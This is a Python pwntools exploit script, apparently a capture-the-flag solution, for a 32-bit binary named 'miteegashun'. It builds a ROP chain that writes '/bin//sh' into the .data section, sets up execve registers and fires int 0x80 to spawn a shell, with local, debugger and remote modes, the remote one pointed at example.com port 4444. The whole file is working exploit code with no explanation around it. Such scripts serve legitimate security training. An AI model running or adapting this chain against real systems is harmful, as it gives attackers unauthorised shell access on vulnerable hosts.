#!/usr/bin/env python3
# -*- coding:utf-8 -*

from pwn import *
from sys import argv
from time import sleep

context.terminal = ['terminator','-e']
context.log_level = "debug"

chall = "./miteegashun"
#libc = ELF()
elf = ELF(chall)
context.binary = chall
context.binary.checksec()

if len(argv) >= 2 and argv[1] == "r":
    p = remote("example.com", 4444)
elif len(argv) >= 2 and argv[1] == "d":
	cmd = """
        # user input
        b *0x8048f51
        # mov ebp, esp
        b *0x8048f6b
        b *0x80c1f06
		c
	"""
	p = gdb.debug(chall,cmd)
else:
    p = process(chall)

data_start = elf.get_section_by_name('.data').header.sh_addr
log.info(".data: 0x{:08x}".format(data_start))
buf_addr = 0x80f0340# no PIE
log.info("buffer@data: 0x{:08x}".format(buf_addr))
ret_addr = 0x80f04dd
log.info("ret@data: 0x{:08x}".format(ret_addr))
offset = ret_addr - buf_addr
log.info("offset: 0x{:04x}".format(offset))
offset2 = 0x108# buffer -> esp
log.info("offset2: 0x{:04x}".format(offset2))
binsh_str = b"/bin//sh"

# exec execve("/bin//sh", ["/bin//sh"]) ROP chain
payload = binsh_str
payload += p32(0)
payload += p32(buf_addr)
payload += p32(0)
payload += b"A" * (offset2 - len(payload))
payload += p32(0x80c1f06)# pop eax; ret
payload += p32(0xb)
payload += p32(0x080481ec)# pop ebx; ret
payload += p32(buf_addr)
payload += p32(0x080e3fa2)# pop ecx ;ret
payload += p32(buf_addr+len(binsh_str)+4)
payload += p32(0x80494f9)# int 0x80
payload += b"B" * (offset-len(payload))
payload += b"C" * 4# padding
payload += p32(0x80481cb)# ret

p.recvuntil("This mitigation is unbeatable, prove me wrong")
sleep(0.5)
p.sendline(payload)

p.interactive()
